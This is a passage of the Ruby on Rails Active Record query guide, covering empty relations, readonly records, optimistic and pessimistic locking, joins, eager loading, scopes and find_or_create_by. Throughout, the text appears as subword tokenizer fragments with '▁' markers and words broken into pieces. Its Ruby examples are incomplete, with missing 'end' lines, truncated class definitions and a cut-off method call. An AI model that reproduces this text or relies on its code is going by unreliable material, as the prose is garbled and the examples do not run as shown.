▁The ▁` n one ` ▁method ▁returns ▁a ▁chain able ▁relation ▁with ▁no ▁records .
▁Any ▁subsequent ▁conditions ▁chain ed ▁to ▁the ▁returned ▁relation ▁will ▁continu e ▁ generating ▁empty ▁relation s .
▁This ▁is ▁useful ▁in ▁scenario s ▁where ▁you ▁need ▁a ▁chain able ▁response ▁to ▁a ▁method ▁or ▁a ▁scope ▁that ▁could ▁return ▁ zero ▁results .
▁Article . n one ▁# ▁returns ▁an ▁empty ▁ Relation ▁and ▁fire s ▁no ▁queries .
▁# ▁The ▁visible _ articles ▁method ▁below ▁is ▁expected ▁to ▁return ▁a ▁ Relation .
▁@ articles ▁= ▁current _ user . v is i b le _ articles . where ( name : ▁params [: name ])
▁def ▁visible _ articles
▁case ▁role
▁when ▁' Co un try ▁M an age r '
▁Article . where ( count ry : ▁count ry )
▁when ▁' Re view er '
▁Article . published
▁when ▁' B ad ▁User '
▁Article . n one ▁# ▁=> ▁return ing ▁[] ▁or ▁nil ▁break s ▁the ▁call er ▁code ▁in ▁this ▁case
▁Read only ▁Object s
▁Active ▁Record ▁provides ▁` readonly ` ▁method ▁on ▁a ▁relation ▁to ▁explicitly ▁d is allow ▁modification ▁of ▁any ▁of ▁the ▁returned ▁objects .
▁Any ▁attempt ▁to ▁alter ▁a ▁ readonly ▁record ▁will ▁not ▁succeed , ▁rais ing ▁an ▁` ActiveRecord :: Re ad O n ly Record ` ▁exception .
▁client ▁= ▁Client . readonly . first
▁client . visit s ▁ + = ▁1
▁client . save
▁As ▁` client ` ▁is ▁explicitly ▁set ▁to ▁be ▁a ▁ readonly ▁object , ▁the ▁above ▁code ▁will ▁raise ▁an ▁` ActiveRecord :: Re ad O n ly Record ` ▁exception ▁when ▁calling ▁` client . save ` ▁with ▁an ▁updated ▁value ▁of ▁ _ visit s _ .
▁ Lock ing ▁Record s ▁for ▁Update
▁ Lock ing ▁is ▁helpful ▁for ▁prevent ing ▁ ra ce ▁conditions ▁when ▁updating ▁records ▁in ▁the ▁database ▁and ▁ en s ur ing ▁ atomic ▁update s .
▁Active ▁Record ▁provides ▁two ▁ lock ing ▁ mechanism s :
▁* ▁O ptimistic ▁ Lock ing
▁* ▁P es s i m ist ic ▁ Lock ing
▁### ▁O ptimistic ▁ Lock ing
▁O ptimistic ▁ lock ing ▁allows ▁multiple ▁users ▁to ▁access ▁the ▁same ▁record ▁for ▁edit s , ▁and ▁assume s ▁a ▁minimum ▁of ▁conflicts ▁with ▁the ▁data .
▁It ▁does ▁this ▁by ▁check ing ▁whether ▁another ▁process ▁has ▁made ▁changes ▁to ▁a ▁record ▁since ▁it ▁was ▁open ed .
▁An ▁` ActiveRecord :: S t al e Object Error ` ▁exception ▁is ▁throw n ▁if ▁that ▁has ▁occur r ed ▁and ▁the ▁update ▁is ▁ignored .
▁** O ptimistic ▁ lock ing ▁column **
▁In ▁order ▁to ▁use ▁ o ptimistic ▁ lock ing , ▁the ▁table ▁needs ▁to ▁have ▁a ▁column ▁called ▁` lock _ version ` ▁of ▁type ▁integer .
▁ Each ▁time ▁the ▁record ▁is ▁updated , ▁Active ▁Record ▁increment s ▁the ▁` lock _ version ` ▁column .
▁If ▁an ▁update ▁request ▁is ▁made ▁with ▁a ▁lower ▁value ▁in ▁the ▁` lock _ version ` ▁field ▁than ▁is ▁current ly ▁in ▁the ▁` lock _ version ` ▁column ▁in ▁the ▁database , ▁the ▁update ▁request ▁will ▁fail ▁with ▁an ▁` ActiveRecord :: S t al e Object Error `.
▁Example :
▁c 1 ▁= ▁Client . find (1)
▁c 2 ▁= ▁Client . find (1)
▁c 1 . first _ name ▁= ▁" Michael "
▁c 1 . save
▁c 2 . name ▁= ▁" s h o ul d ▁fail "
▁c 2 . save ▁# ▁R a is es ▁an ▁ActiveRecord :: S t al e Object Error
▁You ' re ▁the n ▁responsib le ▁for ▁deal ing ▁with ▁the ▁con f li c t ▁by ▁re sc u ing ▁the ▁exception ▁and ▁either ▁roll ing ▁back , ▁m er g ing , ▁or ▁otherwise ▁apply ▁the ▁ business ▁logic ▁needed ▁to ▁resolve ▁the ▁con f li c t .
▁This ▁behavior ▁can ▁be ▁turn ed ▁off ▁by ▁setting ▁` ActiveRecord :: Base . lock _ o ptimistic ally ▁= ▁false `.
▁To ▁override ▁the ▁name ▁of ▁the ▁` lock _ version ` ▁column , ▁` ActiveRecord :: Base ` ▁provides ▁a ▁class ▁attribute ▁called ▁` lock ing _ column ` :
▁self . lock ing _ column ▁= ▁: lock _ client _ column
▁### ▁P es s i m ist ic ▁ Lock ing
▁P es s i m ist ic ▁ lock ing ▁uses ▁a ▁ lock ing ▁ mechanism ▁provided ▁by ▁the ▁under ly ing ▁database .
▁Using ▁` lock ` ▁when ▁build ing ▁a ▁relation ▁obtain s ▁an ▁excl us ive ▁ lock ▁on ▁the ▁select ed ▁row s .
▁ Relation s ▁using ▁` lock ` ▁are ▁usually ▁wrapp ed ▁inside ▁a ▁ transaction ▁for ▁prevent ing ▁ de ad lock ▁conditions .
▁It em . transaction ▁do
▁i ▁= ▁It em . lock . first
▁i . name ▁= ▁' J one s '
▁i . save !
▁The ▁above ▁session ▁produce s ▁the ▁following ▁SQL ▁for ▁a ▁MySQL ▁back end :
▁B E G IN
▁It em ▁Load ▁( 0 . 3 m s ) ▁ SELECT ▁* ▁FROM ▁` item s ` ▁LIMIT ▁1 ▁F O R ▁ UPDATE
▁It em ▁Update ▁( 0 . 4 m s ) ▁ UPDATE ▁` item s ` ▁S E T ▁` updated _ at ` ▁= ▁' 200 9 - 02 - 07 ▁ 18 : 0 5 : 5 6 ' , ▁` name ` ▁= ▁' J one s ' ▁WHERE ▁` id ` ▁= ▁1
▁SQL ▁( 0 . 8 m s ) ▁C O M M I T
▁You ▁can ▁also ▁pass ▁raw ▁SQL ▁to ▁the ▁` lock ` ▁method ▁for ▁allow ing ▁different ▁types ▁of ▁ lock s .
▁For ▁example , ▁MySQL ▁has ▁an ▁expression ▁called ▁` L O C K ▁ IN ▁S H A RE ▁M O D E ` ▁where ▁you ▁can ▁ lock ▁a ▁record ▁but ▁ still ▁allow ▁other ▁queries ▁to ▁read ▁it .
▁To ▁specify ▁this ▁expression ▁just ▁pass ▁it ▁in ▁as ▁the ▁ lock ▁option :
▁i ▁= ▁It em . lock (" L O C K ▁ IN ▁S H A RE ▁M O D E ") . find (1)
▁i . increment ! (: views )
▁If ▁you ▁already ▁have ▁an ▁instance ▁of ▁your ▁model , ▁you ▁can ▁start ▁a ▁ transaction ▁and ▁a c q u i re ▁the ▁ lock ▁in ▁one ▁go ▁using ▁the ▁following ▁code :
▁item ▁= ▁It em . first
▁item . with _ lock ▁do
▁# ▁This ▁block ▁is ▁called ▁within ▁a ▁ transaction ,
▁# ▁item ▁is ▁already ▁ lock ed .
▁item . increment ! (: views )
▁Join ing ▁Table s
▁--------------
▁Active ▁Record ▁provides ▁a ▁finder ▁method ▁called ▁` joins ` ▁for ▁specify ing ▁` J O IN ` ▁clause s ▁on ▁the ▁result ing ▁SQL . ▁There ▁are ▁multiple ▁ways ▁to ▁use ▁the ▁` joins ` ▁method .
▁### ▁Using ▁a ▁ String ▁SQL ▁F ra g ment
▁You ▁can ▁just ▁supply ▁the ▁raw ▁SQL ▁specify ing ▁the ▁` J O IN ` ▁clause ▁to ▁` joins ` :
▁Client . joins (' LE F T ▁O UT ER ▁JOIN ▁addresses ▁ ON ▁addresses . client _ id ▁= ▁clients . id ')
▁This ▁will ▁result ▁in ▁the ▁following ▁SQL :
▁ SELECT ▁clients .
▁* ▁FROM ▁clients ▁ LE F T ▁O UT ER ▁JOIN ▁addresses ▁ ON ▁addresses . client _ id ▁= ▁clients . id
▁### ▁Using ▁ Array / Hash ▁of ▁Name d ▁Associations
▁WARNING : ▁This ▁method ▁only ▁works ▁with ▁` IN N ER ▁JOIN `.
▁Active ▁Record ▁let s ▁you ▁use ▁the ▁names ▁of ▁the ▁[ associations ]( association _ basic s . html ) ▁defined ▁on ▁the ▁model ▁as ▁a ▁shortcut ▁for ▁specify ing ▁` J O IN ` ▁clause s ▁for ▁those ▁associations ▁when ▁using ▁the ▁` joins ` ▁method .
▁For ▁example , ▁consider ▁the ▁following ▁` C ate go ry `, ▁` Article `, ▁` Comment `, ▁` G u est ` ▁and ▁` T a g ` ▁models :
▁class ▁C ate go ry ▁< ▁ActiveRecord :: Base
▁has _ many ▁: articles
▁belongs _ to ▁: category
▁has _ many ▁: comments
▁has _ many ▁: tag s
▁class ▁ Comment ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: article
▁has _ one ▁: guest
▁belongs _ to ▁: comment
▁class ▁T a g ▁< ▁ActiveRecord :: Base
▁Now ▁all ▁of ▁the ▁following ▁will ▁produce ▁the ▁expected ▁join ▁queries ▁using ▁` IN N ER ▁JOIN ` :
▁#### ▁Join ing ▁a ▁S ing le ▁Association
▁C ate go ry . joins (: articles )
▁This ▁produce s :
▁ SELECT ▁categories .
▁* ▁FROM ▁categories
▁ IN N ER ▁JOIN ▁articles ▁ ON ▁articles . category _ id ▁= ▁categories . id
▁Or , ▁in ▁English : ▁" return ▁a ▁C ate go ry ▁object ▁for ▁all ▁categories ▁with ▁articles ".
▁Note ▁that ▁you ▁will ▁see ▁duplicate ▁categories ▁if ▁more ▁than ▁one ▁article ▁has ▁the ▁same ▁ category .
▁If ▁you ▁want ▁unique ▁categories , ▁you ▁can ▁use ▁` C ate go ry . joins (: articles ). un i q `.
▁#### ▁Join ing ▁Multi p le ▁Associations
▁Article . joins (: category , ▁: comments )
▁ SELECT ▁articles .
▁* ▁FROM ▁articles
▁ IN N ER ▁JOIN ▁categories ▁ ON ▁articles . category _ id ▁= ▁categories . id
▁ IN N ER ▁JOIN ▁comments ▁ ON ▁comments . article _ id ▁= ▁articles . id
▁Or , ▁in ▁English : ▁" return ▁all ▁articles ▁that ▁have ▁a ▁ category ▁and ▁at ▁least ▁one ▁comment ".
▁Note ▁again ▁that ▁articles ▁with ▁multiple ▁comments ▁will ▁show ▁up ▁multiple ▁time s .
▁#### ▁Join ing ▁Nest ed ▁Associations ▁( S ing le ▁L e ve l )
▁Article . joins ( comments : ▁: guest )
▁ IN N ER ▁JOIN ▁ guest s ▁ ON ▁ guest s . comment _ id ▁= ▁comments . id
▁Or , ▁in ▁English : ▁" return ▁all ▁articles ▁that ▁have ▁a ▁comment ▁made ▁by ▁a ▁ guest . "
▁#### ▁Join ing ▁Nest ed ▁Associations ▁( M ul t ip le ▁L e ve l )
▁C ate go ry . joins ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tag s ])
▁ IN N ER ▁JOIN ▁tags ▁ ON ▁tags . article _ id ▁= ▁articles . id
▁### ▁Specif ying ▁Conditions ▁on ▁the ▁Join ed ▁Table s
▁You ▁can ▁specify ▁conditions ▁on ▁the ▁join ed ▁table s ▁using ▁the ▁regular ▁[ Array ](# array - condition s ) ▁and ▁[ String ](# p ure - string - condition s ) ▁conditions .
▁[ Hash ▁conditions ](# hash - condition s ) ▁provides ▁a ▁special ▁syntax ▁for ▁specify ing ▁conditions ▁for ▁the ▁join ed ▁table s :
▁time _ range ▁= ▁( Time . now . midnight ▁- ▁1. day ). .
▁Client . joins (: orders ). where (' orders . created _ at ' ▁=> ▁time _ range )
▁An ▁ alternative ▁and ▁clean er ▁syntax ▁is ▁to ▁ n est ▁the ▁hash ▁conditions :
▁Client . joins (: orders ). where ( orders : ▁ { ▁created _ at : ▁time _ range ▁ })
▁This ▁will ▁find ▁all ▁clients ▁who ▁have ▁orders ▁that ▁were ▁created ▁ yesterday , ▁again ▁using ▁a ▁` BETWEEN ` ▁SQL ▁expression .
▁E age r ▁Load ing ▁Associations
▁E age r ▁load ing ▁is ▁the ▁ mechanism ▁for ▁load ing ▁the ▁ associated ▁records ▁of ▁the ▁objects ▁returned ▁by ▁` Model . find ` ▁using ▁as ▁few ▁queries ▁as ▁possible .
▁** N ▁ + ▁1 ▁queries ▁problem **
▁Consider ▁the ▁following ▁code , ▁which ▁find s ▁10 ▁clients ▁and ▁ print s ▁their ▁post code s :
▁clients ▁= ▁Client . limit (10)
▁clients . each ▁do ▁| client |
▁put s ▁client . address . post code
▁This ▁code ▁look s ▁fine ▁at ▁the ▁first ▁ s ight .
▁But ▁the ▁problem ▁ li es ▁within ▁the ▁total ▁number ▁of ▁queries ▁executed .
▁The ▁above ▁code ▁execute s ▁1 ▁( to ▁find ▁10 ▁clients ) ▁ + ▁10 ▁( one ▁per ▁each ▁client ▁to ▁load ▁the ▁address ) ▁= ▁** 11 ** ▁queries ▁in ▁total .
▁** S ol u t ion ▁to ▁N ▁ + ▁1 ▁queries ▁problem **
▁Active ▁Record ▁let s ▁you ▁specify ▁in ▁ advance ▁all ▁the ▁associations ▁that ▁are ▁going ▁to ▁be ▁loaded .
▁This ▁is ▁possible ▁by ▁specify ing ▁the ▁` include s ` ▁method ▁of ▁the ▁` Model . find ` ▁call .
▁With ▁` include s `, ▁Active ▁Record ▁ensure s ▁that ▁all ▁of ▁the ▁specified ▁associations ▁are ▁loaded ▁using ▁the ▁minimum ▁possible ▁number ▁of ▁queries .
▁Re visit ing ▁the ▁above ▁case , ▁we ▁could ▁re write ▁` Client . limit (10) ` ▁to ▁use ▁ eager ▁load ▁addresses :
▁clients ▁= ▁Client . include s (: address ). limit (10)
▁The ▁above ▁code ▁will ▁execute ▁just ▁** 2 ** ▁queries , ▁as ▁oppos ed ▁to ▁** 11 ** ▁queries ▁in ▁the ▁previous ▁case :
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁10
▁ SELECT ▁addresses .
▁* ▁FROM ▁addresses
▁WHERE ▁( address es . client _ id ▁ IN ▁( 1, 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ) )
▁### ▁E age r ▁Load ing ▁Multi p le ▁Associations
▁Active ▁Record ▁let s ▁you ▁ eager ▁load ▁any ▁number ▁of ▁associations ▁with ▁a ▁single ▁` Model . find ` ▁call ▁by ▁using ▁an ▁array , ▁hash , ▁or ▁a ▁nested ▁hash ▁of ▁array / hash ▁with ▁the ▁` include s ` ▁method .
▁#### ▁ Array ▁of ▁Multi p le ▁Associations
▁Article . include s (: category , ▁: comments )
▁This ▁load s ▁all ▁the ▁articles ▁and ▁the ▁ associated ▁ category ▁and ▁comments ▁for ▁each ▁article .
▁#### ▁Nest ed ▁Associations ▁ Hash
▁C ate go ry . include s ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tag s ]) . find (1)
▁This ▁will ▁find ▁the ▁ category ▁with ▁id ▁1 ▁and ▁ eager ▁load ▁all ▁of ▁the ▁ associated ▁articles , ▁the ▁ associated ▁articles ' ▁tags ▁and ▁comments , ▁and ▁every ▁comment ' s ▁ guest ▁association .
▁### ▁Specif ying ▁Conditions ▁on ▁E age r ▁Load ed ▁Associations
▁Even ▁though ▁Active ▁Record ▁let s ▁you ▁specify ▁conditions ▁on ▁the ▁ eager ▁loaded ▁associations ▁just ▁like ▁` joins `, ▁the ▁recommended ▁way ▁is ▁to ▁use ▁[ joins ](# join ing - table s ) ▁instead .
▁However ▁if ▁you ▁must ▁do ▁this , ▁you ▁may ▁use ▁` where ` ▁as ▁you ▁would ▁normally .
▁Article . include s (: comments ). where ( comments : ▁ { ▁visible : ▁true ▁ })
▁This ▁would ▁generate ▁a ▁query ▁which ▁contains ▁a ▁` LE F T ▁O UT ER ▁JOIN ` ▁whereas ▁the < n >` joins ` ▁method ▁would ▁generate ▁one ▁using ▁the ▁` IN N ER ▁JOIN ` ▁function ▁instead .
▁ SELECT ▁" articles "." id " ▁A S ▁t 0 _ r 0, ▁... ▁" comments "." updated _ at " ▁A S ▁t 1 _ r 5 ▁FROM ▁" articles " ▁ LE F T ▁O UT ER ▁JOIN ▁" comments " ▁ ON ▁" comments "." article _ id " ▁= ▁" articles "." id " ▁WHERE ▁( comments . v is i b le ▁= ▁1)
▁If ▁there ▁was ▁no ▁` where ` ▁condition , ▁this ▁would ▁generate ▁the ▁normal ▁set ▁of ▁two ▁queries .
▁NOTE : ▁Using ▁` where ` ▁like ▁this ▁will ▁only ▁work ▁when ▁you ▁pass ▁it ▁a ▁ Hash .
▁Article . include s (: comments ). where (" comments . v is i b le ▁= ▁true ") . reference s (: comments )
▁If , ▁in ▁the ▁case ▁of ▁this ▁` include s ` ▁query , ▁there ▁were ▁no ▁comments ▁for ▁any < n > articles , ▁all ▁the ▁articles ▁would ▁ still ▁be ▁loaded .
▁By ▁using ▁` joins ` ▁( an ▁ IN N ER < n > J O IN ), ▁the ▁join ▁conditions ▁** must ** ▁match , ▁otherwise ▁no ▁records ▁will ▁be < n > return ed .
▁Scopes
▁S co p ing ▁allows ▁you ▁to ▁specify ▁commonly - us ed ▁queries ▁which ▁can ▁be ▁referenced ▁as ▁method ▁calls ▁on ▁the ▁association ▁objects ▁or ▁models .
▁With ▁these ▁scope s , ▁you ▁can ▁use ▁every ▁method ▁previous ly ▁covered ▁such ▁as ▁` where `, ▁` joins ` ▁and ▁` include s `.
▁All ▁scope ▁methods ▁will ▁return ▁an ▁` ActiveRecord :: Relation ` ▁object ▁which ▁will ▁allow ▁for ▁further ▁methods ▁( such ▁as ▁other ▁scope s ) ▁to ▁be ▁called ▁on ▁it .
▁To ▁define ▁a ▁simple ▁scope , ▁we ▁use ▁the ▁` scope ` ▁method ▁inside ▁the ▁class , ▁passing ▁the ▁query ▁that ▁we ' d ▁like ▁to ▁run ▁when ▁this ▁scope ▁is ▁called :
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁This ▁is ▁exactly ▁the ▁same ▁as ▁defin ing ▁a ▁class ▁method , ▁and ▁which ▁you ▁use ▁is ▁a ▁matter ▁of ▁person al ▁p reference :
▁def ▁self . published
▁where ( published : ▁true )
▁Scopes ▁are ▁also ▁chain able ▁within ▁scope s :
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁scope ▁: published _ and _ comment ed , ▁-> ▁ { ▁ published . where (" comments _ count ▁ > ▁0 ") ▁ }
▁To ▁call ▁this ▁` published ` ▁scope ▁we ▁can ▁call ▁it ▁on ▁either ▁the ▁class :
▁ category ▁= ▁C ate go ry . first
▁ category . articles . published ▁# ▁=> ▁[ published ▁articles ▁ belonging ▁to ▁this ▁ category ]
▁### ▁Pass ing ▁in ▁arguments
▁Your ▁scope ▁can ▁take ▁arguments :
▁scope ▁: created _ before , ▁-> ( time ) ▁ { ▁where (" created _ at ▁< ▁ ? ", ▁time ) ▁ }
▁Call ▁the ▁scope ▁as ▁if ▁it ▁were ▁a ▁class ▁method :
▁Article . created _ before ( Time . zone . now )
▁However , ▁this ▁is ▁just ▁ dup li cat ing ▁the ▁functionality ▁that ▁would ▁be ▁provided ▁to ▁you ▁by ▁a ▁class ▁method .
▁def ▁self . created _ before ( time )
▁where (" created _ at ▁< ▁ ? ", ▁time )
▁Using ▁a ▁class ▁method ▁is ▁the ▁preferred ▁way ▁to ▁accept ▁arguments ▁for ▁scope s .
▁These ▁methods ▁will ▁ still ▁be ▁accessible ▁on ▁the ▁association ▁objects :
▁ category . articles . created _ before ( time )
▁### ▁App ly ing ▁a ▁default ▁scope
▁If ▁we ▁wish ▁for ▁a ▁scope ▁to ▁be ▁applied ▁across ▁all ▁queries ▁to ▁the ▁model ▁we ▁can ▁use ▁the < n >` default _ scope ` ▁method ▁within ▁the ▁model ▁itself .
▁default _ scope ▁ { ▁where (" remove d _ at ▁I S ▁NULL ") ▁ }
▁When ▁queries ▁are ▁executed ▁on ▁this ▁model , ▁the ▁SQL ▁query ▁will ▁now ▁look ▁something ▁like < n > this :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁removed _ at ▁I S ▁NULL
▁If ▁you ▁need ▁to ▁do ▁more ▁complex ▁things ▁with ▁a ▁default ▁scope , ▁you ▁can ▁a lternatively < n > define ▁it ▁as ▁a ▁class ▁method :
▁def ▁self . default _ scope
▁# ▁S h o ul d ▁return ▁an ▁ActiveRecord :: Relation .
▁### ▁M er g ing ▁of ▁scope s
▁Ju st ▁like ▁` where ` ▁clause s ▁scope s ▁are ▁merge d ▁using ▁` AND ` ▁conditions .
▁class ▁User ▁< ▁ActiveRecord :: Base
▁scope ▁: active , ▁-> ▁ { ▁where ▁state : ▁' active ' ▁ }
▁scope ▁: in active , ▁-> ▁ { ▁where ▁state : ▁' in active ' ▁ }
▁User . active . in active
▁# ▁ SELECT ▁" users ".
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' active ' ▁ AND ▁" users "." state " ▁= ▁' in active '
▁We ▁can ▁mix ▁and ▁match ▁` scope ` ▁and ▁` where ` ▁conditions ▁and ▁the ▁final ▁ sql < n > will ▁have ▁all ▁conditions ▁join ed ▁with ▁` AND `.
▁User . active . where ( state : ▁' f in is h ed ')
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' active ' ▁ AND ▁" users "." state " ▁= ▁' f in is h ed '
▁User . active . merge ( User . in active )
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' in active '
▁One ▁important ▁caveat ▁is ▁that ▁` default _ scope ` ▁will ▁be ▁ prepend ed ▁in < n >` scope ` ▁and ▁` where ` ▁conditions .
▁default _ scope ▁ { ▁where ▁state : ▁' pending ' ▁ }
▁User . all
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' pending '
▁User . active
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' pending ' ▁ AND ▁" users "." state " ▁= ▁' active '
▁User . where ( state : ▁' in active ')
▁# ▁ SELECT ▁" users ". * ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' pending ' ▁ AND ▁" users "." state " ▁= ▁' in active '
▁As ▁you ▁can ▁see ▁above ▁the ▁` default _ scope ` ▁is ▁being ▁merge d ▁in ▁both < n >` scope ` ▁and ▁` where ` ▁conditions .
▁### ▁Re m o v ing ▁All ▁S co p ing
▁If ▁we ▁wish ▁to ▁remove ▁ s co p ing ▁for ▁any ▁reason ▁we ▁can ▁use ▁the ▁` unscope d ` ▁method .
▁This ▁is < n > es pecially ▁useful ▁if ▁a ▁` default _ scope ` ▁is ▁specified ▁in ▁the ▁model ▁and ▁should ▁not ▁be < n > app li ed ▁for ▁this ▁particular ▁query .
▁Client . unscope d . load
▁This ▁method ▁remove s ▁all ▁ s co p ing ▁and ▁will ▁do ▁a ▁normal ▁query ▁on ▁the ▁table .
▁Note ▁that ▁chain ing ▁` unscope d ` ▁with ▁a ▁` scope ` ▁does ▁not ▁work .
▁In ▁these ▁cases , ▁it ▁is < n > re com m end ed ▁that ▁you ▁use ▁the ▁block ▁form ▁of ▁` unscope d ` :
▁Client . unscope d ▁ {
▁Client . created _ before ( Time . zone . now )
▁D y n am ic ▁Find ers
▁For ▁every ▁field ▁( also ▁known ▁as ▁an ▁attribute ) ▁you ▁define ▁in ▁your ▁table , ▁Active ▁Record ▁provides ▁a ▁finder ▁method .
▁If ▁you ▁have ▁a ▁field ▁called ▁` first _ name ` ▁on ▁your ▁` Client ` ▁model ▁for ▁example , ▁you ▁get ▁` find _ by _ first _ name ` ▁for ▁free ▁from ▁Active ▁Record .
▁If ▁you ▁have ▁a ▁` lock ed ` ▁field ▁on ▁the ▁` Client ` ▁model , ▁you ▁also ▁get ▁` find _ by _ lock ed ` ▁and ▁methods .
▁You ▁can ▁specify ▁an ▁excl am ation ▁point ▁( ` !` ) ▁on ▁the ▁end ▁of ▁the ▁dynamic ▁finder s ▁to ▁get ▁them ▁to ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁error ▁if ▁they ▁do ▁not ▁return ▁any ▁records , ▁like ▁` Client . find _ by _ name ! (" Ryan ") `
▁If ▁you ▁want ▁to ▁find ▁both ▁by ▁name ▁and ▁ lock ed , ▁you ▁can ▁chain ▁these ▁finder s ▁together ▁by ▁simply ▁typing ▁" ` and ` " ▁between ▁the ▁fields .
▁For ▁example , ▁` Client . find _ by _ first _ name _ and _ lock ed (" Ryan ", ▁true ) `.
▁Find ▁or ▁B u il d ▁a ▁ New ▁Object
▁Active ▁Record
▁It ' s ▁common ▁that ▁you ▁need ▁to ▁find ▁a ▁record ▁or ▁create ▁it ▁if ▁it ▁does n ' t ▁exist .
▁You ▁can ▁do ▁that ▁with ▁the ▁` find _ or _ create _ by ` ▁and ▁` find _ or _ create _ by !` ▁methods .
▁### ▁` find _ or _ create _ by `
▁The ▁` find _ or _ create _ by ` ▁method ▁check s ▁whether ▁a ▁record ▁with ▁the ▁attributes ▁exists .
▁If ▁it ▁does n ' t , ▁the n ▁` create ` ▁is ▁called .
▁Let ' s ▁see ▁an ▁example .
▁Suppose ▁you ▁want ▁to ▁find ▁a ▁client ▁named ▁' Andy ' , ▁and ▁if ▁there ' s ▁non e , ▁create ▁one .
▁You ▁can ▁do ▁so ▁by ▁running :
▁Client . find _ or _ create _ by ( first _ name : ▁' Andy ')
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Andy ", ▁orders _ count : ▁0 , ▁ lock ed : ▁true , ▁created _ at : ▁" 2011 - 08 -30 ▁ 06 : 0 9 : 27 ", ▁updated _ at : ▁" 2011 - 08 -30 ▁ 06 : 0 9 : 27 ">
▁The ▁SQL ▁generated ▁by ▁this ▁method ▁look s ▁like ▁this :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . first _ name ▁= ▁' Andy ') ▁LIMIT ▁1
▁ IN S ER T ▁ IN T O ▁clients ▁( created _ at , ▁first _ name , ▁ lock ed , ▁orders _ count , ▁updated _ at ) ▁ V A L U E S ▁( ' 2011 - 08 -30 ▁0 5 : 22 : 57 ' , ▁' Andy ' , ▁1, ▁NULL , ▁' 2011 - 08 -30 ▁0 5 : 22 : 57 ')
▁C O M M I T
▁` find _ or _ create _ by ` ▁returns ▁either ▁the ▁record ▁that ▁already ▁exists ▁or ▁the ▁new ▁record .
▁In ▁our ▁case , ▁we ▁did n ' t ▁already ▁have ▁a ▁client ▁named ▁ Andy ▁so ▁the ▁record ▁is ▁created ▁and ▁returned .
▁The ▁new ▁record ▁m ight ▁not ▁be ▁saved ▁to ▁the ▁database ; ▁that ▁depend s ▁on ▁whether ▁validations ▁passed ▁or ▁not ▁( j us t ▁like ▁` create ` ).
▁Suppose ▁we ▁want ▁to ▁set ▁the ▁' lock ed ' ▁attribute ▁to ▁` false ` ▁if ▁we ' re < n > creating ▁a ▁new ▁record , ▁but ▁we ▁don ' t ▁want ▁to ▁include ▁it ▁in ▁the ▁query .
▁So < n > we ▁want ▁to ▁find ▁the ▁client ▁named ▁" Andy ", ▁or ▁if ▁that ▁client ▁does n ' t < n > ex ist , ▁create ▁a ▁client ▁named ▁" Andy " ▁which ▁is ▁not ▁ lock ed .
▁We ▁can ▁achieve ▁this ▁in ▁two ▁ways .
▁The ▁first ▁is ▁to ▁use ▁` create _ with ` :
▁Client . create _ with ( lock ed : ▁false ). find _ or _ create _ by ( first _ name : ▁' Andy ')
▁The ▁second ▁way ▁is ▁using ▁a ▁block :
▁Client . find _ or _ create _ by ( first _ name : ▁' Andy ') ▁do ▁| c |
▁c . lock ed ▁= ▁false
▁The ▁block ▁will ▁only ▁be ▁executed ▁if ▁the ▁client ▁is ▁being ▁created .
▁The < n > second ▁time ▁we ▁run ▁this ▁code , ▁the ▁block ▁will ▁be ▁ignored .
▁### ▁` find _ or _ create _ by !
▁You ▁can ▁also ▁use ▁` find _ or _ create _ by !` ▁to ▁raise ▁an ▁exception ▁if ▁the ▁new ▁record ▁is ▁invalid .
▁Validation s ▁are ▁not ▁covered ▁on ▁this ▁guide , ▁but ▁let ' s ▁assume ▁for ▁a ▁moment ▁that ▁you ▁t emporarily ▁add
▁validates ▁: orders _ count , ▁presence : ▁true
▁to ▁your ▁` Client ` ▁model .
▁If ▁you ▁try ▁to ▁create ▁a ▁new ▁` Client ` ▁without ▁passing ▁an ▁` orders _ count `, ▁the ▁record ▁will ▁be ▁invalid ▁and ▁an ▁exception ▁will ▁be ▁raised :
▁first _ name : ▁' Andy ')
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁ Order s ▁count ▁can ' t ▁be ▁blank
▁### ▁` find _ or _ initialize _ by `
▁The ▁` find _ or _ initialize _ by ` ▁method ▁will ▁work ▁just ▁like < n >` find _ or _ create _ by ` ▁but ▁it ▁will ▁call ▁` new ` ▁instead ▁of ▁` create `.
▁This < n > me an s ▁that ▁a ▁new ▁model ▁instance ▁will ▁be ▁created ▁in ▁memory ▁but ▁won ' t ▁be < n > save d ▁to ▁the ▁database .
▁Co n t in u ing ▁with ▁the ▁` find _ or _ create _ by ` ▁example , ▁we < n > now ▁want ▁the ▁client ▁named ▁' N ic k ' :
▁ n ic k ▁= ▁Client . find _ or _ initialize _ by ( first _ name : ▁' N ic k ')
▁# ▁=> ▁< Client ▁id : ▁nil , ▁first _ name : ▁" N ic k ", ▁orders _ count : ▁0 , ▁ lock ed : ▁true , ▁created _ at : ▁" 2011 - 08 -30 ▁ 06 : 0 9 : 27 ", ▁updated _ at : ▁" 2011 - 08 -30 ▁ 06 : 0 9 : 27 ">
▁ n ic k . p ers ist ed ?
▁# ▁=> ▁false
▁ n ic k . new _ record ?
▁# ▁=> ▁true
▁Because ▁the ▁object ▁is ▁not ▁yet ▁store d ▁in ▁the ▁database , ▁the ▁SQL ▁generated ▁look s ▁like ▁this :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . first _ name ▁= ▁' N ic k ') ▁LIMIT ▁1
